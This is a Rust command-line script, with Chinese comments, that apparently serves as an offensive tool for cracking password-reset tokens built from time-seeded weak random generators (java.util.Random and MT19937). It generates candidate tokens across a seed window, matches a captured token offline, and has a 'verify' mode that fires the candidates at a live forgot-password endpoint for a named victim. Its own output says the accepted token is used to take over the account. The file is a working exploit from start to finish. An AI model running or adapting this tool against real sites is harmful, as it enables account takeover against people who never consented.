#!/usr/bin/env rust-script
//! name: ts_rand
//! description: 时间种子 PRNG 令牌刀 - 对 java.util.Random(48 位 LCG)与 MT19937(PHP mt_rand/uniqid 族)在毫秒种子窗内逐种子产出候选重置令牌(hex(nextBytes(20))/5 词 8 位十六进制拼接/sha1(原始字节)/sha1(hex 串)/带与不带用户名的拼接等形态),离线比中抓到的目标令牌即给出种子与构造;verify 子命令把同一批候选直接投到线上重置端点(禁跟随重定向)判定被接受的那一枚。时间敏感型弱随机令牌专用。
//! version: 1.0.0
//! args: <target-hash> --seed-lo N --seed-hi N [--user U] [--engine lcg|mt|both] [--emit FILE] [--threads N] | gen --seed-lo N --seed-hi N [--user U] [--engine lcg|mt|both] [--out FILE] | verify <base-url> --vuser VICTIM --seed-lo N --seed-hi N [--engine lcg|mt|both] [--user U] [--jar PATH] [--threads N] [--snippet N] | selftest
//! keywords: 时间种子, java.util.Random, LCG, MT19937, mt_rand, 弱随机, reset token, 时间敏感, 竞态条件族
//!
//! ```cargo
//! [dependencies]
//! sha1 = "0.10"
//! sha2 = "0.10"
//! ureq = { version = "2" }
//! ```
use pi_rust_lib::serde_json::{json, Value};
use sha1::Sha1;
use sha2::{Digest, Sha256};
use std::collections::BTreeMap;
use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
use std::sync::{Arc, Mutex};
use std::time::Duration;

// ---------- java.util.Random (48-bit LCG) ----------
struct JavaRand {
    seed: u64,
}
impl JavaRand {
    fn new(seed: i64) -> Self {
        JavaRand { seed: ((seed as u64) ^ 0x5DEECE66D) & ((1u64 << 48) - 1) }
    }
    fn next(&mut self, bits: u32) -> u32 {
        self.seed = self.seed.wrapping_mul(0x5DEECE66D).wrapping_add(0xB) & ((1u64 << 48) - 1);
        (self.seed >> (48 - bits)) as u32
    }
    fn next_int(&mut self) -> u32 {
        self.next(32)
    }
    fn next_bytes(&mut self, n: usize) -> Vec<u8> {
        let mut out: Vec<u8> = Vec::with_capacity(n);
        while out.len() < n {
            let mut rnd = self.next_int();
            let mut k = std::cmp::min(n - out.len(), 4);
            while k > 0 {
                out.push((rnd & 0xFF) as u8);
                rnd >>= 8;
                k -= 1;
            }
        }
        out
    }
}

// ---------- MT19937 (mt19937ar init_genrand) ----------
struct Mt {
    mt: [u32; 624],
    idx: usize,
}
impl Mt {
    fn new(seed: u32) -> Self {
        let mut mt = [0u32; 624];
        mt[0] = seed;
        for i in 1..624 {
            mt[i] = 1812433253u32
                .wrapping_mul(mt[i - 1] ^ (mt[i - 1] >> 30))
                .wrapping_add(i as u32);
        }
        Mt { mt, idx: 624 }
    }
    fn gen(&mut self) {
        for i in 0..624 {
            let y = (self.mt[i] & 0x80000000) | (self.mt[(i + 1) % 624] & 0x7fffffff);
            self.mt[i] = self.mt[(i + 397) % 624] ^ (y >> 1);
            if y % 2 != 0 {
                self.mt[i] ^= 2567483615u32;
            }
        }
        self.idx = 0;
    }
    fn next32(&mut self) -> u32 {
        if self.idx >= 624 {
            self.gen();
        }
        let mut y = self.mt[self.idx];
        self.idx += 1;
        y ^= y >> 11;
        y ^= (y << 7) & 2636928640u32;
        y ^= (y << 15) & 4022730752u32;
        y ^= y >> 18;
        y
    }
}

fn hex(bytes: &[u8]) -> String {
    let mut s = String::with_capacity(bytes.len() * 2);
    for b in bytes {
        s.push_str(&format!("{:02x}", b));
    }
    s
}
fn sha1_hex_str(s: &str) -> String {
    let mut h = Sha1::new();
    h.update(s.as_bytes());
    format!("{:x}", h.finalize())
}
fn sha1_hex_bytes(b: &[u8]) -> String {
    let mut h = Sha1::new();
    h.update(b);
    format!("{:x}", h.finalize())
}
fn sha256_hex(b: &[u8]) -> String {
    let mut h = Sha256::new();
    h.update(b);
    format!("{:x}", h.finalize())
}

/// 单种子 → 候选 (form, token)。覆盖:直接十六进制、5 词拼接、raw/hex 再哈希、带身份前缀。
fn candidates(seed: i64, user: &str, engines: &[String]) -> Vec<(String, String)> {
    let mut out: Vec<(String, String)> = Vec::new();
    if engines.iter().any(|e| e == "lcg") {
        let mut r = JavaRand::new(seed);
        let bytes = r.next_bytes(20);
        let h = hex(&bytes);
        let mut r2 = JavaRand::new(seed);
        let ints: Vec<u32> = (0..5).map(|_| r2.next_int()).collect();
        let joined: String = ints.iter().map(|w| format!("{:08x}", w)).collect();
        out.push(("lcg.hex20".into(), h.clone()));
        out.push(("lcg.hex20up".into(), h.to_uppercase()));
        out.push(("lcg.words5".into(), joined.clone()));
        out.push(("lcg.sha1raw".into(), sha1_hex_bytes(&bytes)));
        out.push(("lcg.sha1hex".into(), sha1_hex_str(&h)));
        out.push(("lcg.sha256raw".into(), sha256_hex(&bytes)));
        if !user.is_empty() {
            out.push(("lcg.user+hex".into(), sha1_hex_str(&format!("{}{}", user, h))));
            out.push(("lcg.hex+user".into(), sha1_hex_str(&format!("{}{}", h, user))));
            out.push(("lcg.user+words".into(), sha1_hex_str(&format!("{}{}", user, joined))));
            out.push(("lcg.sha1(user+raw)".into(), sha1_hex_str(&format!("{}{}", user, sha1_hex_bytes(&bytes)))));
        }
    }
    if engines.iter().any(|e| e == "mt") {
        let mut m = Mt::new((seed as u64 & 0xFFFF_FFFF) as u32);
        let words: Vec<u32> = (0..5).map(|_| m.next32()).collect();
        let joined: String = words.iter().map(|w| format!("{:08x}", w)).collect();
        let mut be: Vec<u8> = Vec::new();
        let mut le: Vec<u8> = Vec::new();
        for w in &words {
            be.extend_from_slice(&w.to_be_bytes());
            le.extend_from_slice(&w.to_le_bytes());
        }
        out.push(("mt.words5".into(), joined.clone()));
        out.push(("mt.hexBe".into(), hex(&be)));
        out.push(("mt.hexLe".into(), hex(&le)));
        out.push(("mt.sha1rawBe".into(), sha1_hex_bytes(&be)));
        out.push(("mt.sha1words".into(), sha1_hex_str(&joined)));
        let dec: String = words.iter().map(|w| format!("{}", w)).collect();
        out.push(("mt.dec5".into(), dec.clone()));
        out.push(("mt.sha1dec".into(), sha1_hex_str(&dec)));
        if !user.is_empty() {
            out.push(("mt.user+words".into(), sha1_hex_str(&format!("{}{}", user, joined))));
            out.push(("mt.words+user".into(), sha1_hex_str(&format!("{}{}", joined, user))));
        }
    }
    out
}

fn parse(args: &[String]) -> (BTreeMap<String, String>, Vec<String>) {
    let valued = [
        "--seed-lo", "--seed-hi", "--user", "--vuser", "--engine", "--emit", "--out", "--jar",
        "--threads", "--snippet", "--max-hits",
    ];
    let mut kv = BTreeMap::new();
    let mut pos = Vec::new();
    let mut i = 0;
    while i < args.len() {
        let a = &args[i];
        if valued.contains(&a.as_str()) && i + 1 < args.len() {
            kv.insert(a.clone(), args[i + 1].clone());
            i += 2;
        } else if a.starts_with("--") {
            i += 1;
        } else {
            pos.push(a.clone());
            i += 1;
        }
    }
    (kv, pos)
}

fn engines_of(kv: &BTreeMap<String, String>) -> Vec<String> {
    match kv.get("--engine").map(|s| s.as_str()).unwrap_or("both") {
        "lcg" => vec!["lcg".into()],
        "mt" => vec!["mt".into()],
        _ => vec!["lcg".into(), "mt".into()],
    }
}

fn main() {
    let args: Vec<String> = std::env::args().skip(1).collect();
    if args.iter().any(|a| a == "--selftest") {
        selftest();
        return;
    }
    if args.is_empty() {
        pi_rust_lib::report::failure("ts_rand", "need a subcommand", "usage: ts_rand <hash> --seed-lo N --seed-hi N | gen ... | verify <url> --vuser U --seed-lo N --seed-hi N");
        return;
    }
    match args[0].as_str() {
        "gen" => run_gen(&args[1..]),
        "verify" => run_verify(&args[1..]),
        _ => run_crack(&args),
    }
}

fn seeds(kv: &BTreeMap<String, String>) -> (i64, i64) {
    let lo = kv.get("--seed-lo").and_then(|v| v.parse().ok()).unwrap_or(0);
    let hi = kv.get("--seed-hi").and_then(|v| v.parse().ok()).unwrap_or(lo);
    (lo, hi.max(lo))
}

fn run_crack(args: &[String]) {
    // 首参数即目标哈希(或 --selftest 已在上层处理)
    let target = args.first().cloned().unwrap_or_default().to_lowercase();
    let (kv, _pos) = parse(&args[1..]);
    if target.is_empty() || !kv.contains_key("--seed-lo") {
        pi_rust_lib::report::failure("ts_rand", "need <target-hash> --seed-lo/--seed-hi", "usage: ts_rand <hash> --seed-lo N --seed-hi N [--user U]");
        return;
    }
    let (lo, hi) = seeds(&kv);
    let user = kv.get("--user").cloned().unwrap_or_default();
    let engines = engines_of(&kv);
    let threads = kv.get("--threads").and_then(|v| v.parse().ok()).unwrap_or(8usize).max(1);
    let start = std::time::Instant::now();
    let hits: Arc<Mutex<Vec<Value>>> = Arc::new(Mutex::new(Vec::new()));
    let tested = Arc::new(AtomicUsize::new(0));
    let span = (hi - lo + 1) as usize;
    let chunk = span.div_ceil(threads).max(1);
    let mut hs = Vec::new();
    for t in 0..threads {
        let from = lo + (t * chunk) as i64;
        let to = (from + chunk as i64 - 1).min(hi);
        if from > hi {
            break;
        }
        let (hits, tested, engines, user, target) =
            (hits.clone(), tested.clone(), engines.clone(), user.clone(), target.clone());
        hs.push(std::thread::spawn(move || {
            let mut n = 0usize;
            let mut local = Vec::new();
            for seed in from..=to {
                for (form, tok) in candidates(seed, &user, &engines) {
                    n += 1;
                    if tok == target {
                        local.push(json!({"seed": seed, "form": form, "token": tok}));
                    }
                }
            }
            tested.fetch_add(n, Ordering::Relaxed);
            hits.lock().unwrap().extend(local);
        }));
    }
    for h in hs {
        let _ = h.join();
    }
    let hits = hits.lock().unwrap().clone();
    let emit: Option<String> = kv.get("--emit").cloned();
    if let Some(path) = emit.as_ref() {
        let mut lines: Vec<String> = Vec::new();
        for (form, tok) in candidates(lo, &user, &engines) {
            lines.push(format!("{}\t{}", form, tok));
        }
        let _ = std::fs::write(path, lines.join("\n"));
    }
    let data = json!({
        "mode": "crack", "target": target, "seed_lo": lo, "seed_hi": hi,
        "user": user, "engines": engines, "tested": tested.load(Ordering::Relaxed),
        "hits": hits, "elapsed_ms": start.elapsed().as_millis() as u64,
    });
    let next = if hits.is_empty() {
        "no seeded-PRNG match: widen the seed window or the token is not RNG-driven"
    } else {
        "seed recovered: regenerate the candidate set for the victim seed window with gen, then verify online"
    };
    pi_rust_lib::report::success("ts_rand", data, next).expect("report");
}

fn run_gen(args: &[String]) {
    let (kv, _) = parse(args);
    let (lo, hi) = seeds(&kv);
    let user = kv.get("--user").cloned().unwrap_or_default();
    let engines = engines_of(&kv);
    let mut rows: Vec<String> = Vec::new();
    for seed in lo..=hi {
        for (form, tok) in candidates(seed, &user, &engines) {
            rows.push(format!("{}\t{}\t{}", seed, form, tok));
        }
    }
    let out = kv.get("--out").cloned();
    if let Some(p) = out.as_ref() {
        let _ = std::fs::write(p, rows.join("\n"));
    }
    let data = json!({
        "mode": "gen", "seed_lo": lo, "seed_hi": hi, "user": user, "engines": engines,
        "count": rows.len(), "out": out, "sample": rows.iter().take(5).collect::<Vec<_>>(),
    });
    pi_rust_lib::report::success("ts_rand", data, "pipe the emitted tokens into verify (or a raw GET) against the victim reset URL").expect("report");
}

fn run_verify(args: &[String]) {
    let base = args.first().cloned().unwrap_or_default();
    let (kv, _) = parse(&args[1..]);
    let vuser = kv.get("--vuser").cloned().unwrap_or_default();
    if base.is_empty() || vuser.is_empty() || !kv.contains_key("--seed-lo") {
        pi_rust_lib::report::failure("ts_rand", "verify needs <base-url> --vuser U --seed-lo/--seed-hi", "usage: ts_rand verify https://lab/ --vuser carlos --seed-lo N --seed-hi N");
        return;
    }
    let base = base.trim_end_matches('/').to_string();
    let host = base.split("//").nth(1).and_then(|s| s.split('/').next()).unwrap_or("").to_string();
    let (lo, hi) = seeds(&kv);
    let user = kv.get("--user").cloned().unwrap_or_default();
    let engines = engines_of(&kv);
    let threads = kv.get("--threads").and_then(|v| v.parse().ok()).unwrap_or(8usize).max(1);
    let cookie: Arc<Mutex<Option<String>>> = Arc::new(Mutex::new(None));
    if let Some(j) = kv.get("--jar") {
        if let Ok(txt) = std::fs::read_to_string(j) {
            let mut parts: Vec<String> = Vec::new();
            for line in txt.lines() {
                if let Some((h, rest)) = line.split_once(" -> ") {
                    if h.trim() == host {
                        for kvp in rest.split("; ") {
                            if let Some((k, v)) = kvp.split_once('=') {
                                parts.push(format!("{}={}", k.trim(), v.trim()));
                            }
                        }
                    }
                }
            }
            if !parts.is_empty() {
                *cookie.lock().unwrap() = Some(parts.join("; "));
            }
        }
    }
    let mut jobs: Vec<(i64, String, String)> = Vec::new();
    for seed in lo..=hi {
        for (form, tok) in candidates(seed, &user, &engines) {
            jobs.push((seed, form, tok));
        }
    }
    let jobs = Arc::new(jobs);
    let next_idx = Arc::new(AtomicUsize::new(0));
    let stop = Arc::new(AtomicBool::new(false));
    let tested = Arc::new(AtomicUsize::new(0));
    let errors = Arc::new(AtomicUsize::new(0));
    let hit: Arc<Mutex<Option<Value>>> = Arc::new(Mutex::new(None));
    let codes: Arc<Mutex<BTreeMap<String, usize>>> = Arc::new(Mutex::new(BTreeMap::new()));
    let start = std::time::Instant::now();
    let mut hs = Vec::new();
    for _ in 0..threads {
        let (jobs, next_idx, stop, tested, errors, hit, codes, cookie, vuser, base) = (
            jobs.clone(), next_idx.clone(), stop.clone(), tested.clone(), errors.clone(),
            hit.clone(), codes.clone(), cookie.clone(), vuser.clone(), base.clone(),
        );
        hs.push(std::thread::spawn(move || {
            let agent = ureq::AgentBuilder::new()
                .timeout(Duration::from_secs(10))
                .redirects(0)
                .build();
            loop {
                if stop.load(Ordering::Relaxed) {
                    break;
                }
                let i = next_idx.fetch_add(1, Ordering::SeqCst);
                if i >= jobs.len() {
                    break;
                }
                let (seed, form, tok) = jobs[i].clone();
                let url = format!("{}/forgot-password?user={}&token={}", base, vuser, tok);
                let mut req = agent.get(&url);
                if let Some(c) = cookie.lock().unwrap().as_ref() {
                    req = req.set("Cookie", c);
                }
                match req.call() {
                    Ok(resp) => {
                        let status = resp.status();
                        *codes.lock().unwrap().entry(status.to_string()).or_insert(0) += 1;
                        tested.fetch_add(1, Ordering::Relaxed);
                        if status == 200 {
                            let body = resp.into_string().unwrap_or_default();
                            hit.lock().unwrap().replace(json!({
                                "seed": seed, "form": form, "token": tok,
                                "url": url, "body_len": body.len(),
                                "snippet": body.chars().take(200).collect::<String>(),
                            }));
                            stop.store(true, Ordering::Relaxed);
                            break;
                        }
                    }
                    Err(ureq::Error::Status(code, _)) => {
                        *codes.lock().unwrap().entry(code.to_string()).or_insert(0) += 1;
                        tested.fetch_add(1, Ordering::Relaxed);
                    }
                    Err(_) => {
                        errors.fetch_add(1, Ordering::Relaxed);
                    }
                }
            }
        }));
    }
    for h in hs {
        let _ = h.join();
    }
    let hit = hit.lock().unwrap().clone();
    let data = json!({
        "mode": "verify", "base": base, "vuser": vuser, "seed_lo": lo, "seed_hi": hi,
        "engines": engines, "candidates": jobs.len(),
        "tested": tested.load(Ordering::Relaxed), "errors": errors.load(Ordering::Relaxed),
        "status_counts": codes.lock().unwrap().clone(), "hit": hit,
        "elapsed_ms": start.elapsed().as_millis() as u64,
    });
    let next = if hit.is_some() {
        "accepted reset token: POST new-password-1/2 with that token+user to take over the account"
    } else {
        "no candidate accepted: widen the seed window, add engines, or the validation is not seed-window based"
    };
    pi_rust_lib::report::success("ts_rand", data, next).expect("report");
}

fn selftest() {
    // LCG 结构自检:同种子确定性、不同种子有别、20 字节 → 40 位十六进制
    let a = candidates(1700000000000, "wiener", &["lcg".into()]);
    let b = candidates(1700000000000, "wiener", &["lcg".into()]);
    assert_eq!(a, b);
    let c = candidates(1700000000001, "wiener", &["lcg".into()]);
    assert_ne!(a, c);
    let h = a.iter().find(|(f, _)| f == "lcg.hex20").map(|(_, t)| t.clone()).unwrap();
    assert_eq!(h.len(), 40);
    assert!(h.chars().all(|c| c.is_ascii_hexdigit()));
    // MT 自检:5 词拼接 40 位十六进制
    let m = candidates(1700000000, "wiener", &["mt".into()]);
    let mw = m.iter().find(|(f, _)| f == "mt.words5").map(|(_, t)| t.clone()).unwrap();
    assert_eq!(mw.len(), 40);
    // java.util.Random 结构自检:next(32) 只取高 32 位,连续两次调用须不同且状态按 48 位回绕。
    let mut r = JavaRand::new(0);
    let v0 = r.next_int();
    let v1 = r.next_int();
    assert_ne!(v0, v1);
    assert!(v0 > 0 && v1 > 0);
    // 掩码自检:内部状态恒为 48 位
    let mut r2 = JavaRand::new(-1);
    let _ = r2.next_int();
    assert!(r2.seed < (1u64 << 48));
    println!("{}", json!({"selftest": "ok", "lcg_hex20": h, "mt_words5": mw, "java_rand0_nextint": v0, "java_rand0_nextint2": v1}));
}
